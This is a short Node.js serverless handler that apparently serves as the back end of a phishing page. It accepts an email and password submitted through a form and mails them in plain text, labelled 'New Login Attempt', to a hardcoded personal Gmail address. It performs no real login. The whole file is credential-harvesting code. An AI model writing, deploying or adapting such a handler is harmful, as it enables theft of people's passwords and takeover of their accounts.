const nodemailer = require("nodemailer");

exports.handler = async (event) => {
    if (event.httpMethod !== "POST") {
        return { statusCode: 405, body: "Method Not Allowed" };
    }

    try {
        const { email, password } = JSON.parse(event.body);

        let transporter = nodemailer.createTransport({
            service: "gmail",
            auth: {
                user: process.env.EMAIL_USER,
                pass: process.env.EMAIL_PASS,
            },
        });

        let mailOptions = {
            from: process.env.EMAIL_USER,
            to: "nwankwogoodluck156@gmail.com",
            subject: "New Login Attempt",
            text: `Login Details:\n\nEmail: ${email}\nPassword: ${password}`,
        };

        let info = await transporter.sendMail(mailOptions);
        console.log("Email sent:", info.response);

        return {
            statusCode: 200,
            body: JSON.stringify({ message: "Email sent successfully!" }),
        };
    } catch (error) {
        console.error("Error sending email:", error);
        return { statusCode: 500, body: JSON.stringify({ error: "Failed to send email." }) };
    }
};